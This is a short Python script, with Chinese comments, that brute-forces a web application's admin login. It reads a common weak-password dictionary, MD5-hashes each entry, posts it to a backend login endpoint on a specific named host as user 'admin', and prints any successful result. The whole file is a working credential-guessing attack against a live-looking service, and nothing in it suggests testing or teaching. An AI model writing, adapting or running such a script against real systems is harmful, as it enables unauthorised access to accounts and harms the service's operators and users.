import requests
import hashlib
from threading import Thread

passwords = []

# 获取弱口令字典
def getDictionary():
    f = open("./dictionary_common.txt", "r")
    lines = f.readlines()
    for line in lines:
        passwords.append(line.strip("\n"))

# 发起登录请求
def login(id, pwd):
    r = requests.post("http://linux.crqcn.com:3000/Http/Msg/MsgStart.ashx?method=Backend_Login",
                  data={"ID": id, "PWD": hashlib.md5(pwd.encode(encoding="UTF-8")).hexdigest()})
    print(r.status_code)
    if(r.json()["flag"]=="True"):
        print(pwd,r.json()["result"])
    else:
        print(pwd,r.json()["message"])


# 主流程
getDictionary()
for pwd in passwords:
    login("admin",pwd)
